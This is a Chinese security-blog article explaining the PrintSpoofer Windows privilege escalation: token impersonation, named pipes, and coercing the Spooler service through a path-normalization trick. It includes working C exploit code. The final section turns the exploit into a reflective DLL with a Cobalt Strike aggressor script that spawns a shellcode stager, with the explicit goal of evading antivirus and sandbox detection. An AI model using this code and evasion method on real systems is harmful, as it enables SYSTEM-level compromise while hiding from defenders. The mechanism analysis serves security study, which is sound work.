# PrintSpoofer提权原理探究

阅读量 **241883**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-19 10:00:17

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

> 相关工具实现在文章中列出

## 前言

在安全研究员itm4n发布了PrintSpoofer提权的思路，整体思路其实也是通过中继获取SYSTEM令牌，再通过模拟令牌执行命令。

另有区别的是在`Potato`提权中多数是通过利用RPC中继的方式，例如在`Rotten
Potato`中，通过`CoGetInstanceFromIStorage` 加载COM对象`BITS
服务`来使得以SYSTEM身份运行的`BITS服务`向攻击者监听的端口发起连接并进行NTLM认证,但是NTLM认证仍然需要被重放到RPC服务器(默认情况下是135端口)以构造`对应的协商或者挑战包`从而返回,以实现欺骗`NT
AUTHORITY\SYSTEM`帐户通过
NTLM向我们控制的`TCP`端点进行身份验证，最后通过`AcquireCredentialsHandle`和`AcceptSecurityContext`来完成身份验证过程并获取令牌，从而以高权限令牌指定运行进程

> CoGetInstanceFromIStorage会尝试从 “指定的 host:port” 加载 “指定对象“ 的实例（通过 CLSID
> 指定对象），BITS 的 CLSID 为 {4991d34b-80a1-4291-83b6-3328366b9097}

下图可以很清晰的看出`Rotten Potato`的攻击流程

![](https://p5.ssl.qhimg.com/t01c80134c9b3f8e0c9.png)

但是利用该接口在`Windows
10`上将不再适用，原因是可能由于OXID解析器有关，在调用`IstorageTrigger::MarshalInterface`已经省略RPC绑定字符串中的端口，其中port也就是我们的本地侦听器端口，这就意味着COM连接现在只允许在TCP端口135上使用，因此就无法实现中间人攻击，但是RPC不是可用于这种中继场景的唯一协议，这里PrintSpoofer提权中则是使用了非常经典的管道(pipe)

但是在开始之前，想先介绍`Windows Access Token`令牌模拟部分

## Windows Access Token令牌模拟

`Windows Token`又叫`Access
Token(访问令牌)`，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后,都会生成一个`Access
Token`，这个Token在用户创建进程或者线程时会被使用并且不断的拷贝，这也就解释了A用户创建一个进程而该进程也不会有B用户的权限。

关于该令牌的解释可以在MSDN中找到:  
[https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDN](https://)

###  Access Token组成

令牌分为如下两类:

  * 主令牌（Primary令牌）
  * 模拟令牌（Impersonation令牌）

> 注:当用户注销后，系统将会使主令牌切换为模拟令牌，而模拟令牌不会被清除，只有在重启机器后才会清除

每个进程都有一个主令牌，用于描述与进程关联的用户帐户的安全上下文。 默认情况下，当进程的线程与安全对象交互时，系统将使用主令牌。

此外，线程可以模拟客户端帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有主令牌和模拟令牌。

令牌的组成主要有如下部分:

    
    
    用户帐户 ( SID) 安全标识符
    用户是其中一个成员的组的 ID
    标识 当前登录 会话的 登录 SID
    用户 或 用户组拥有的权限列表
    所有者 SID
    主组的 SID
    用户创建安全对象而不指定安全描述符时系统 使用的默认 DACL
    访问令牌的源
    令牌是主 令牌还是模拟令牌
    限制 SID 的可选列表
    当前模拟级别
    其他统计信息
    

关于`Windows Access Token`的 **创建过程** :

使用凭据(用户密码)进行认证–>登录Session创建–>Windows返回用户sid和用户组sid–>LSA(Local Security
Authority)创建一个Token–>依据该token创建进程、线程(如果CreaetProcess时自己指定了 Token, LSA会用该Token，
否则就继承父进程Token进行运行)

**模拟等级**  
[https://docs.microsoft.com/zh-cn/windows/win32/secauthz/impersonation-levels](https://)  
`SECURITY _ IMPERSONATION _ LEVEL`枚举定义四个模拟级别，这些模拟级别确定服务器可以在客户端上下文中执行的操作。

模拟级别 | 说明  
---|---  
SecurityAnonymous | 服务器无法模拟或标识客户端  
SecurityIdentification | 服务器可以获取客户端的标识和特权，但不能模拟客户端  
SecurityImpersonation | 服务器可以模拟本地系统上的客户端安全上下文  
SecurityDelegation | 服务器可以在远程系统上模拟客户端的安全上下文  
  
文档中给出了三个通过用户身份创建进程的函数:

函数 | 需要特权 | 输入  
---|---|---  
CreateProcessWithLogon | null | 域/用户名/密码  
CreateProcessWithToken | SeImpersonatePrivilege | Primary令牌  
CreateProcessAsUser | SeAssignPrimaryTokenPrivilege和SeIncreaseQuotaPrivilege |
Primary令牌  
  
从这三个Win
API中我们可以很容易的发现，当拥有SeAssignPrimaryToken或者SeImpersonate权限时，我们可以通过模拟Primary令牌的方式来创建新进程从而提升权限，换句话说只有当令牌具有Impersonation和Delegation级别的时候才可以进行模拟。

**如何获取令牌**  
Win API中提供了`OpenProcessToken/openThreadToken`等函数用来打开某个进程或者线程的访问令牌，其函数原型如下:

    
    
    BOOL OpenProcessToken(
      HANDLE  ProcessHandle, //访问令牌已打开的进程的句柄
      DWORD   DesiredAccess,
      PHANDLE TokenHandle //指向句柄的指针，该句柄在函数返回时标识新打开的访问令牌。
    );
    
    BOOL OpenThreadToken(
      HANDLE  ThreadHandle, //打开访问令牌的线程的句柄。
      DWORD   DesiredAccess,
      BOOL    OpenAsSelf,
      PHANDLE TokenHandle //指向接收新打开的访问令牌句柄的变量的指针
    );
    

> 通过OpenThreadToken/OpenProcessToken函数来获取访问令牌具有客户端安全上下文的模拟令牌。

在这里，模拟令牌和主令牌之间是可以通过`DuplicateTokenEx`函数互相转换的  
[DuplicateTokenEx](https://docs.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)

文档中给出了`DuplicateTokenEx`创建主令牌的典型场景,服务器应用程序创建一个线程，该线程调用其中一个模拟函数（例如
`ImpersonateNamedPipeClient`）来模拟客户端。模拟线程然后调用
OpenThreadToken函数来获取自己的令牌，该令牌是具有客户端安全上下文的模拟令牌。该线程在对`DuplicateTokenEx`的调用中指定此模拟令牌，并指定
TokenPrimary标志。该DuplicateTokenEx函数创建一个主令牌具有客户端的安全上下文。

因此，一个模拟令牌的过程大概是:  
OpenProcess(获取目标进程上下文)->OpenProcessToken(获得进程访问令牌的句柄)–>DuplicateTokenEx(创建一个主/模拟令牌)–>CreateProcessWithTokenW(创建进程)

因此当我们拥有`SeImpersonatePrivilege`权限时便可以通过对进程爆破的方式找到满足如下条件的进程:

  * 进程运行用户是SYSTEM
  * 令牌级别至少是Impersonation级别
  * 攻击者运行的权限至少拥有SeImpersonatePrivilege

这里仿照编写了一个C#的提权程序，遍历进程并且通过`openProcessToken`得到模拟令牌转化成主令牌创建进程

**项目地址:**  
 **<https://github.com/crisprss/autoGetSystem>**

我们可以看到，当以管理员身份运行cmd时才会有`SeImpersonatePrivilege`

![](https://p3.ssl.qhimg.com/t01485b31b5799ddfd8.png)

注意不要认为该情况适用于所有存在`SeImpersonatePrivilege`特权的账户，例如服务账户等，因为如果以服务账户启动的时候虽然存在该特权，但是在任务管理器中并没有可以利用的`SYSTEM`权限运行的进程:

![](https://p0.ssl.qhimg.com/t010455752e1980f4c1.png)

而当我们以管理员或者普通用户来查看时会发现:

![](https://p4.ssl.qhimg.com/t0117a011946101f38c.png)

存在大量的SYSTEM进程可以利用，因此这也就是为何我们还需进一步探索PrintSpoofer提权

## 如何模拟RPC

回到前面遇到的问题上，我们知道在Win 10中已经做出了调整，利用`IStorage
COM`组件只允许和135端口进行通信，意味着中间人攻击已经失效，我们无法进行重放，因此漏洞作者把目光放到了管道上:

管道可以有两种类型：

  * 匿名管道 — 匿名管道通常在父进程和子进程之间传输数据。它们通常用于在子进程与其父进程之间重定向标准输入和输出。
  * 命名管道 — 命名管道可以在不相关的进程之间传输数据，前提是管道的权限授予对客户端进程的适当访问权限。

我们知道，RPC服务器一般通过`RpcImpersonateClient()`来模拟RPC客户端安全上下文，模拟后续可以进行委派或其他操作，而在Windows中同样管道也可以通过`ImpersonateNamedPipeClient()`RPC模拟客户端

同样是借助官方文档的说明:

命名管道服务器线程可以调用`ImpersonateNamedPipeClient`函数来假定连接到管道客户端的用户的访问令牌。例如，命名管道服务器可以提供对管道服务器具有特权访问权限的数据库或文件系统的访问。当管道客户端向服务器发送请求时，服务器模拟客户端并尝试访问受保护的数据库。然后系统会根据客户端的安全级别授予或拒绝服务器的访问权限。当服务器完成时，它使用`RevertToSelf`函数恢复其原始安全令牌。

**该模拟级别决定了在模拟客户端服务器可以执行的操作。默认情况下，服务器在 SecurityImpersonation模拟级别进行模拟**
。但是，当客户端调用CreateFile函数打开管道客户端的句柄时，客户端可以使用
`SECURITY_SQOS_PRESENT`标志来控制服务器的模拟级别。

这里写了一个简单的管道模拟RPC客户端的程序，显示在模拟RPC客户端时能够拿到的令牌种类和模拟权限,这里主要是通过`TOKEN_STATICS结构体`来确定令牌的相关信息，结构体如下:

    
    
    typedef struct _TOKEN_STATISTICS {
        LUID TokenId;
        LUID AuthenticationId;
        LARGE_INTEGER ExpirationTime;
        TOKEN_TYPE TokenType;
        SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
        DWORD DynamicCharged;
        DWORD DynamicAvailable;
        DWORD GroupCount;
        DWORD PrivilegeCount;
        LUID ModifiedId;
    } TOKEN_STATISTICS, *PTOKEN_STATISTICS;
    

其中核心代码贴出:

![](https://p0.ssl.qhimg.com/t01de13005f30080986.png)

**项目地址:**  
 **<https://github.com/crisprss/listTokeninfoByPipe>**

![](https://p5.ssl.qhimg.com/t01bdcc7cf0c5e8ab4d.png)

可以看到在这里映证了通过`OpenThreadToken`拿到的令牌是模拟令牌，并且模拟级别是`SecurityImpersonation`,意味着服务器可以在本地系统上模拟客户端的安全上下文。

需要注意的是如果连接管道是使用`\\.\pipe\crispr`，连接建立但是并不会有后续操作,也就是说`ImpersonateNamedPipeClient()`函数会失败

![](https://p2.ssl.qhimg.com/t01a80bf53ef51688dc.png)

这一点在作者原文中也并没有找到答案，因此如果有知道原因的师傅还请指正。

## 令牌的利用

接着前文我们知道获取的令牌是有能够模拟RPC客户端的权限，而在前文`Windows Access
Token`我们提到了如果拥有`SeImpersonatePrivilege`权限时，我们可以通过`CreateProcessWithToken`的方式创建进程，同样用前文所提的写的一个项目来演示:

![](https://p0.ssl.qhimg.com/t01d8f250293dc367af.png)

在这里新加一个函数用来利用令牌实现一些其他的自定义功能,在这里为了演示方便就弹个notepad:

    
    
    void DoSomethingAsImpersonatedUser(HANDLE hToken)
    {
        DWORD dwCreationFlags = 0;
        dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
        BOOL g_bInteractWithConsole = TRUE;
        LPWSTR pwszCurrentDirectory = NULL;
        dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
        LPVOID lpEnvironment = NULL;
        PROCESS_INFORMATION pi = { 0 };
        STARTUPINFO si = { 0 };
    
        HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
        {
            wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
            CloseHandle(hToken);
        }
        if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"notepad.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
        {
            wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
            CloseHandle(hSystemTokenDup);
        }
        else
        {
            wprintf(L"[+] CreateProcessWithTokenW() OK\n");
        }
    }
    

当我们以普通用户运行尝试调用`CreateProcessWithTokenW`时是会失败的，原因是我们并没有`SeImpersonatePrivilege`特权

![](https://p5.ssl.qhimg.com/t0100a476498f5aa4ca.png)

> 需要注意的是管道就像文件或注册表项一样是安全的对象。这意味着如果没有在创建的命名管道上设置适当的权限，以不同身份运行的客户端可能根本无法访问它

而当我们拥有`SeImpersonatePrivilege`权限时,这里以`NT AUTHORITY\NETWORK SERVICE`服务用户为例

![](https://p2.ssl.qhimg.com/t01072d14db82f5e1fa.png)

我们可以看到成功通过SYSTEM权限的令牌创建了进程`notepad.exe`

![](https://p3.ssl.qhimg.com/t010b4279c425fff999.png)

![](https://p1.ssl.qhimg.com/t01602204c86a9625be.png)

因此通过这个demo就已经基本清楚了我们的方向和步骤，只要能够让高权限进程和我们的管道进行连接，便可以通过管道模拟RPC客户端得到SYSTEM令牌后创建进程从提权

## 如何欺骗SYSTEM连接管道

作者是利用了 **打印机错误** 漏洞  
项目地址:<https://github.com/leechristensen/SpoolSample>

Windows的`MS-RPRN`协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的`RpcRemoteFindFirstPrinterChangeNotificationEx()`调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。  
其函数原型如下:

![](https://p2.ssl.qhimg.com/t016d445fce8e271e6d.png)

**pszLocalMachine：指向表示客户端计算机名称的字符串的指针。**

这意味着我们可以利用该错误通过`MS-RPRN RPC`接口强制Windows主机向其他机器进行身份验证,
**另外微软表示这个bug是系统设计特点，无需修复。**

但这和管道又有什么关系呢？答案是有的，我们来看Windows官方文档中给出打印机客户端的初始化说明:

![](https://p3.ssl.qhimg.com/t01b97cdce8c72e5b15.png)

这意味着`Print Spooler`服务的RPC接口其实是暴露在命名管道：`\\.\pipe\spoolss`，而该该项服务是默认开启的状态

![](https://p3.ssl.qhimg.com/t01de3459ba371f123e.png)

我们可以通过[pipelist](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist)来查看:

![](https://p2.ssl.qhimg.com/t019f14f21fae7e1a94.png)

此时又出现一个问题，本来打印机错误是针对攻击域控主机，连接域控主机然后在本地机器上接收通知，即本地扮演打印机客户端的角色，但是由于本地提权的原因，我们需要
**连接到本地机器并在本地机器上接收通知**

我们先使用原作者的项目[SpoolSample](https://github.com/leechristensen/SpoolSample)

如果我们都设置为本地机器时，此时会出现一个问题，该打印机漏洞利用的原理其实是
**强迫运行Spooler服务的任何主机通过Kerberos或者NTLM向攻击者选择的目标发起身份认证请求**

我们这里只需要强迫主机通过管道连接到我们的管道即可

![](https://p2.ssl.qhimg.com/t01176325a33e6cf94a.png)

但是在这里由于调用`RpcRemoteFindFirstPrinterChangeNotification(Ex)`方法，服务通知将发送到`\\AttackIP\pipe\spoolss`.
这个管道是由`NT AUTHORITY\SYSTEM`控制，而该管道已经存在因此我们不能创建自己的同名管道

当尝试在管道后面加入`\`来表示让`\\localhost\pipe\crispr`管道接受服务通知时我们可以看到调用其实会由于路径验证检查而失败,意味着同样还是使用`\pipe\spools`管道进行接收

![](https://p4.ssl.qhimg.com/t01898d25806826aeb5.png)

而我们是想指定我们之前所写好的恶意管道进行接收，这样才能够模拟高权限RPC客户端从而创建进程，难道在这里就无法指定我们的恶意管道进行接收吗？

###  利用

回到我们之前的一张图

![](https://p2.ssl.qhimg.com/t0123501611d5ad5859.png)

在官方文档中给出了[说明](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)，这里`pszLocalMachine`可以是一个UNC路径

![](https://p3.ssl.qhimg.com/t019b0f43600ee12e8f.png)

因此如果SERVER_NAME是`\\127.0.0.1\`，系统用户会访问 `\\127.0.0.1\pipe\spoolss`

但如果是这样呢?

![](https://p0.ssl.qhimg.com/t01c101811825d4d256.png)

如果主机名包含`/`，它将通过路径验证检查，但是在计算要连接的命名管道的路径时，规范化会将其转换为`\`，并且系统还将其认为是IPC连接的方式去发送服务通知

因此，作者的思路便很容易产生了，我们将接收通知的主机名设置为`\\localhost/pipe/crispr`,由于路径规范化的问题，打印机服务器会误认为打印机客户端的管道为`\\localhost\pipe\crispr\pipe\spoolss`

而该管道和默认`\\.\pipe\spoolss`不是同一个管道，因此我们可以通过创建恶意管道`\\localhost\pipe\crispr\pipe\spoolss`来等待SYSTEM权限的`spoolsv.exe`进程连接我们的管道:

![](https://p4.ssl.qhimg.com/t01a23b0a9bfa698085.png)

仍然通过前文的测试程序进行演示:

![](https://p4.ssl.qhimg.com/t0137bae9423850320b.png)

通过普通用户的权限成功提权至SYSTEM，并且列出了令牌的相关信息和权限情况，注意这里我们同样只是使用了具有`SeImpersonatePrivilege`特权的服务账户，具体原因[官方文档](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)中给出了答案

![](https://p5.ssl.qhimg.com/t01acd14b8053f0f999.png)

## 写在最后

原理分析到这已经到尾声，最后就是提权漏洞作者itm4n给出的Printspoofer的项目  
[https://github.com/itm4n/PrintSpoofer/tree/master/PrintSpoofer](https://)  
然而该程序显然已经被主机防护软件列为黑名单了，因此我们还需要在源代码的基础上做出修改以绕过主机防护软件的拦截

根据之前的文章，可以考虑全局修改`printspoofer`关键词进行绕过，这里全部修改为`pipeCrispr`后编译生成发现该种方法已经失效:

同样会被拦截，当再次尝试将输出内容全部简化并且输出一些不相关的字符串时重新编译运行可以看到此时防护软件已经不会将其识别成恶意文件，而只是发现进行提权操作，说明在这里我们的更改是部分有效的

当然这里都是可以过静态查杀，只是肯定需要动态运行进行提权，因此还需要绕过动态查杀，因此在这里我首先尝试使用前文的`testpipe.exe`结合`spoolSample`如果打开不是`cmd.exe`等进程并不会被拦截:

![](https://p4.ssl.qhimg.com/t0107663aa76f7e540e.png)

而当打开为`cmd.exe`进程时则会被提示可疑提权操作，因此判断可能是监控了进程树发现该进程产生了`cmd.exe`的子进程

正当我一筹莫展之时想到了不妨使用比较传统的加密免杀软件试试加密，这里我选择 **shellter**
,生成32位的程序，然后通过`shellter.exe`进行加密，不幸的是尝试过很多姿势都避免不了沙箱和动态查杀，因此想到了使用反射DLL注入的方式结合CS进行攻击

反射DLL已经有了比较成熟的项目，并且一般CS中编写反射注入DLL基本都是使用的该项目  
<https://github.com/stephenfewer/ReflectiveDLLInjection>  
因此当我们构造一个`reflective_dll`进行反射注入，这样避免了文件落地，推测大概率不会被查杀

  * 1.导入相关的头文件：ReflectiveDllInjection.h、ReflectiveLoader.cpp、ReflectiveLoader.h
  * 2.将原来部分提权的操作放到`dllmain.cpp`中,主要是放在`DLL_PROCESS_ATTACH`中  
这里贴下`dllmain.cpp`的代码:

    
    
    #include "ReflectiveLoader.h"
    #include "PrintSpoofer.h"
    #include <iostream>
    
    extern HINSTANCE hAppInstance;
    EXTERN_C IMAGE_DOS_HEADER __ImageBase;
    
    BOOL PrintSpoofer() {
        BOOL bResult = TRUE;
        LPWSTR pwszPipeName = NULL;
        HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
        HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
        HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
        DWORD dwWait = 0;
    
        if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
            wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
            bResult = FALSE;
            goto cleanup;
        }
    
        wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
    
        if (!GenerateRandomPipeName(&pwszPipeName)) {
            wprintf(L"[-] Failed to generate a name for the pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
    
        if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
            wprintf(L"[-] Failed to create a named pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
    
        if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
            wprintf(L"[-] Failed to connect the named pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
    
        wprintf(L"[+] Named pipe listening...\n");
    
        if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
            wprintf(L"[-] Failed to trigger the Spooler service.\n");
            bResult = FALSE;
            goto cleanup;
        }
    
        dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
        if (dwWait != WAIT_OBJECT_0) {
            wprintf(L"[-] Operation failed or timed out.\n");
            bResult = FALSE;
            goto cleanup;
        }
    
        if (!GetSystem(hSpoolPipe)) {
            bResult = FALSE;
            goto cleanup;
        }
        wprintf(L"[+] Exploit successfully, enjoy your shell\n");
    
    cleanup:
        if (hSpoolPipe)
            CloseHandle(hSpoolPipe);
        if (hSpoolPipeEvent)
            CloseHandle(hSpoolPipeEvent);
        if (hSpoolTriggerThread)
            CloseHandle(hSpoolTriggerThread);
    
        return bResult;
    }
    
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
        BOOL bReturnValue = TRUE;
        DWORD dwResult = 0;
    
        switch (dwReason) {
        case DLL_QUERY_HMODULE:
            if (lpReserved != NULL)
                *(HMODULE*)lpReserved = hAppInstance;
            break;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            if (PrintSpoofer()) {
                fflush(stdout);
    
                if (lpReserved != NULL)
                    ((VOID(*)())lpReserved)();
            } else {
                fflush(stdout);
            }
    
            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
        }
        return bReturnValue;
    }
    

完成DLL的编写之后我们接下来在实现cna的编写即可:

    
    
    sub printspoofer {
        btask($1, "Task Beacon to run " . listener_describe($2) . " via PrintSpoofer");
    
        if (-is64 $1)
        {
            $arch = "x64";
            $dll = script_resource("PrintSpoofer.x64.dll");
        } else {
            $arch = "x86";
            $dll = script_resource("PrintSpoofer.x86.dll");
        }
        $stager = shellcode($2, false, $arch);
    
        bdllspawn!($1, $dll, $stager, "PrintSpoofer local elevate privilege", 5000);
    
        bstage($1, $null, $2, $arch);
    }
    
    beacon_exploit_register("PrintSpoofer", "PrintSpoofer local elecate privilege", &printspoofer);
    

通过反射DLL注入的方式最终实现了免杀

**项目地址:**  
[https://github.com/crisprss/PrintSpoofer  
](https://)

* * *

参考文章

  * <https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/>
  * <https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>
  * <https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/>
  * [https://docs.microsoft.com/en-us/search/?scope=Desktop&terms=RpcRemoteFindFirstPrinterChangeNotificationEx(](https://docs.microsoft.com/en-us/search/?scope=Desktop&terms=RpcRemoteFindFirstPrinterChangeNotificationEx\())
  * <https://daiker.gitbook.io/windows-protocol/ntlm-pian/5>
  * <https://rootclay.gitbook.io/windows-access-control/quan-xian-kong-zhi-qi-ta-nei-rong>
  * <https://cloud.tencent.com/developer/article/1808276>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Crispr** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254904](/post/id/254904)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [提权](/tag/提权)
  * [渗透](/tag/渗透)
  * [windows安全](/tag/windows安全)

 **+1** __8赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f727a088f341ab8f.png) Crispr

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

